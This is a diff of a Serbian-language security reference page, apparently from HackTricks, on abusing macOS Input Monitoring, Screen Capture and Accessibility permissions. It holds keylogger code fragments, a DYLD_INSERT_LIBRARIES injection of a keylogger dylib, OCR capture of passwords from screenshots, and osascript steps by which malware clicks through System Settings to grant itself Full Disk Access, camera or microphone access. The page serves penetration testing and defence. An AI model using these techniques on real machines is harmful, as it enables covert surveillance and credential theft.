@@ -1,27 +1,27 @@
-# Zloupotreba macOS Input Monitoring, Screen Capture i Accessibility dozvola
+# Zloupotreba nadzora unosa, snimanja ekrana i Accessibility funkcija u macOS-u
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Pregled
 
-Tri povezana TCC servisa kontrolišu kako aplikacije mogu da nadgledaju korisnikovu desktop sesiju i stupaju u interakciju sa njom:
+Tri povezana TCC servisa kontrolišu način na koji aplikacije mogu da posmatraju desktop sesiju korisnika i stupaju u interakciju s njom:
 
-| TCC Service | Dozvola | Mogućnost |
+| TCC servis | Dozvola | Mogućnost |
 |---|---|---|
-| `kTCCServiceListenEvent` | **Input Monitoring** | Čitanje svih događaja tastature i miša na nivou celog sistema (keylogging) |
-| `kTCCServicePostEvent` | **Input Injection** | Ubrizgavanje sintetičkih događaja tastature i miša |
-| `kTCCServiceScreenCapture` | **Screen Capture** | Čitanje bafera ekrana, pravljenje snimaka ekrana i snimanje ekrana |
-| `kTCCServiceAccessibility` | **Accessibility** | Kontrolisanje drugih aplikacija putem AXUIElement API-ja i čitanje UI elemenata |
+| `kTCCServiceListenEvent` | **Nadzor unosa** | Čitanje svih događaja tastature i miša na nivou celog sistema (keylogging) |
+| `kTCCServicePostEvent` | **Ubacivanje unosa** | Ubacivanje sintetičkih događaja tastature i miša |
+| `kTCCServiceScreenCapture` | **Snimanje ekrana** | Čitanje bafera ekrana, pravljenje snimaka ekrana, snimanje ekrana |
+| `kTCCServiceAccessibility` | **Accessibility** | Kontrolisanje drugih aplikacija putem AXUIElement API-ja, čitanje elemenata korisničkog interfejsa |
 
-Ove dozvole predstavljaju **najopasniju kombinaciju na macOS-u** — zajedno omogućavaju:
-- Potpuni keylogging svakog pritiska na taster (lozinke, poruke, platne kartice)
-- Snimanje ekrana celokupnog vidljivog sadržaja
-- Ubrizgavanje sintetičkog unosa (klik na dugmad i odobravanje dijaloga)
+Ove dozvole predstavljaju **najopasniju kombinaciju** na macOS-u — zajedno omogućavaju:
+- Potpuni keylogging svakog pritiska na taster (lozinke, poruke, kreditne kartice)
+- Snimanje svega što je vidljivo na ekranu
+- Ubacivanje sintetičkog unosa (kliktanje na dugmad, odobravanje dijaloga)
 - Potpunu GUI kontrolu ekvivalentnu fizičkom pristupu
 
 ---
 
-## Input Monitoring (kTCCServiceListenEvent)
+## Nadzor unosa (kTCCServiceListenEvent)
 
 ### Kako funkcioniše
 
@@ -49,7 +49,7 @@ CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
 return event;
 }
 ```
-### Pronalaženje binarnih datoteka sa ovlašćenjima
+### Pronalaženje binarnih datoteka sa dodeljenim pravima
 ```bash
 # Find processes with input monitoring TCC grants
 sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
@@ -59,9 +59,9 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
 "SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
 ```
-### Napad: Keylogging putem Code Injection-a
+### Attack: Keylogging putem Code Injection
 
-Ako binarija sa dozvolom ListenEvent takođe ima **isključenu validaciju biblioteka** ili **dozvoljava DYLD promenljive okruženja**, napadač može da ubaci dylib koji registruje CGEventTap:
+Ako binarni fajl sa dozvolom ListenEvent takođe ima **onemogućenu validaciju biblioteka** ili **dozvoljava DYLD environment variables**, napadač može da ubaci dylib koji registruje CGEventTap:
 ```bash
 # Check if the target allows code injection
 codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
@@ -70,11 +70,11 @@ grep -E "allow-dyld|disable-library-validation"
 # If both are present, inject a keylogger dylib:
 DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
 ```
-The injected dylib inherits the target's ListenEvent TCC grant and captures all keystrokes.
+Injektovani dylib nasleđuje ListenEvent TCC odobrenje cilja i beleži sve pritiske tastera.
 
 ### Attack: Credential Harvesting
 
-A sophisticated keylogger can correlate keystrokes with the active application:
+Sofisticirani keylogger može da poveže pritiske tastera sa aktivnom aplikacijom:
 ```objc
 // Get the frontmost application to contextualize keystrokes
 NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
@@ -85,11 +85,11 @@ NSString *appName = frontApp.localizedName;
 ```
 ---
 
-## Ubrizgavanje unosa (kTCCServicePostEvent)
+## Ubrizgavanje ulaza (kTCCServicePostEvent)
 
 ### Kako funkcioniše
 
-PostEvent permission omogućava kreiranje event tap-a sa **`kCGEventTapOptionDefault`** (može da menja/ubacuje događaje) umesto ListenOnly.<sup>[[1]](#references)</sup> Ovo omogućava:
+PostEvent dozvola omogućava kreiranje event tap-a sa **`kCGEventTapOptionDefault`** (može da menja/ubrizgava događaje) umesto ListenOnly.<sup>[[1]](#references)</sup> Ovo omogućava:
 ```objc
 // Inject a keystroke
 CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
@@ -103,9 +103,9 @@ CGPointMake(100, 200),
 kCGMouseButtonLeft);
 CGEventPost(kCGSessionEventTap, click);
 ```
-### Napad: Automated TCC Prompt Approval
+### Napad: Automatsko odobravanje TCC upita
 
-Pomoću alata PostEvent, napadač može **simulirati klik na „Allow“** u TCC dijalozima za dozvole:
+Pomoću PostEvent-a, napadač može **simulirati klik na „Allow“** u dijalozima TCC dozvola:
 ```bash
 # Using cliclick (if available) or direct CGEvent injection:
 # 1. Trigger a TCC prompt for the malware
@@ -143,9 +143,9 @@ sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
 sqlite3 /tmp/executables.db "
 SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
 ```
-### Napad: Hvatanje akreditiva putem OCR-a
+### Napad: Credential Capture via OCR
 
-Ubrizgani proces za snimanje ekrana može periodično da snima kadrove i koristi OCR za izdvajanje lozinki:
+Ubačeni proces za snimanje ekrana može periodično da snima kadrove i koristi OCR za izdvajanje lozinki:
 ```bash
 # Basic screen capture from a process with the TCC grant
 screencapture -x /tmp/screen.png
@@ -154,11 +154,11 @@ screencapture -x /tmp/screen.png
 screencapture -x -l <windowID> /tmp/window.png
 ```
 > [!WARNING]
-> Počev od **macOS Sonoma**, snimanje ekrana prikazuje **trajni indikator** na traci menija. U starijim verzijama, snimanje ekrana moglo je biti potpuno neprimetno. Međutim, kratko snimanje jednog kadra korisnici i dalje možda neće primetiti.
+> Počev od **macOS Sonoma**, snimanje ekrana prikazuje **stalni indikator** na menijskoj traci. Na starijim verzijama, snimanje ekrana moglo je biti potpuno neprimetno. Međutim, kratko snimanje od jednog kadra korisnici i dalje možda neće primetiti.
 
 ### Attack: Session Recording
 
-Kontinuirano snimanje ekrana pruža potpunu reprodukciju korisničke sesije:
+Kontinuirano snimanje ekrana pruža kompletnu reprodukciju korisničke sesije:
 ```objc
 // Using ScreenCaptureKit for streaming capture (macOS 12.3+)
 // This captures frames continuously with minimal CPU impact
@@ -170,17 +170,17 @@ config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
 ```
 ---
 
-## Pristupačnost (kTCCServiceAccessibility)
+## Accessibility (kTCCServiceAccessibility)
 
 ### Kako funkcioniše
 
-Pristup funkcijama pristupačnosti omogućava kontrolu nad drugim aplikacijama putem **AXUIElement API-ja**.<sup>[[2]](#references)</sup> Proces sa dozvolom za pristupačnost može:
+Accessibility pristup omogućava kontrolu nad drugim aplikacijama putem **AXUIElement API-ja**.<sup>[[2]](#references)</sup> Proces sa accessibility pristupom može:
 
-1. **Čitati** bilo koji element korisničkog interfejsa u bilo kojoj aplikaciji (tekstualna polja, oznake, dugmad, menije)
+1. **Čitati** bilo koji UI element u bilo kojoj aplikaciji (tekstualna polja, oznake, dugmad, menije)
 2. **Kliktati** na dugmad i komunicirati sa kontrolama
 3. **Unositi** tekst u bilo koje tekstualno polje
-4. **Kretati se** kroz menije i dijaloge
-5. **Ekstrahovati** prikazane podatke iz bilo koje pokrenute aplikacije
+4. **Navigirati** kroz menije i dijaloge
+5. **Scrape-ovati** prikazane podatke iz bilo koje pokrenute aplikacije
 ```objc
 // Get the frontmost application
 AXUIElementRef app = AXUIElementCreateApplication(pid);
@@ -197,7 +197,7 @@ AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
 ```
 ### Napad: Samostalno dodeljivanje TCC dozvola
 
-Najopasnija zloupotreba accessibility funkcije jeste **kretanje kroz System Settings radi dodeljivanja sopstvenom malware-u dodatnih dozvola**:
+Najopasnija zloupotreba Accessibility funkcije jeste **kretanje kroz System Settings radi dodeljivanja dodatnih dozvola sopstvenom malware-u**.<sup>[[4]](#references)</sup>
 ```bash
 # Using osascript with accessibility access:
 # Navigate to Privacy & Security > Full Disk Access
@@ -260,7 +260,7 @@ osascript -e 'tell application "System Events" to key code 36' -- Press Enter
 5. Open Terminal, type commands as if the user did it
 6. Result: equivalent to physical keyboard/mouse access
 ```
-### Lanac: Pristupačnost → Samostalno dodeljivanje pristupa kameri/mikrofonu → Nadzor
+### Lanac: Accessibility → Self-Grant Camera/Mic → Nadzor
 ```
 1. Start with only Accessibility permission
 2. Open System Settings > Privacy & Security > Camera
@@ -290,11 +290,10 @@ SELECT path FROM executables
 WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
 AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
 ```
-## Reference
+## References
 
 - [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
 - [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
 - [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
-- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)
-
+- [4] [Objective-See — Sintetički događaji i bezbednost korisničkog interfejsa na macOS-u](https://objective-see.org/blog/blog_0x36.html)
 {{#include ../../../banners/hacktricks-training.md}}
